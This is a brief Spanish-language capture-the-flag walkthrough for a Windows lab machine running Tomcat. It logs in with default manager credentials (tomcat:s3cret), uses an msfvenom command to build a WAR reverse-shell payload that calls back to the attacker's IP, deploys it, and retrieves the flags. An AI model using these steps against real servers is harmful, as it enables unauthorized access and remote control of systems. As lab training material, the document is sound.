10.10.10.95
Windows
Port: 8080

- Vamos a ver su pagina web.
- Tenemos un Tomcat, por lo tanto existe un login para poder entrar.
![](../../Imagenes/Pasted%20image%2020250322165238.png)
- Sabemos que por lo general cuando no se configura bien, Tomcat viene con usuarios predefinidos, vamos a probar cada usuario
- Las credenciales eran, ==tomcat:s3cret==.
![[Pasted image 20250317175955.png]]
- Tenemos como subir un archivo para hacer una reverse.
- Vamos a hacer un payload con msfvenom.
```
msfvenom -p java/shell_reverse_tcp LHOST=(IP_ATACANTE) LPORT=443 -f war -o (NOMBRE)
```
![[Pasted image 20250317180229.png]]
- Vamos a subirlo.
![[Pasted image 20250317180320.png]]
- Ya esta subido, vamos a hacer la reverse y recordar hacer otra reverse estando dentro para tener una conexión mas estable.
![[Pasted image 20250317180523.png]]
- Ya estamos dentro.
- Buscamos y encontraremos las flags de usuario y root.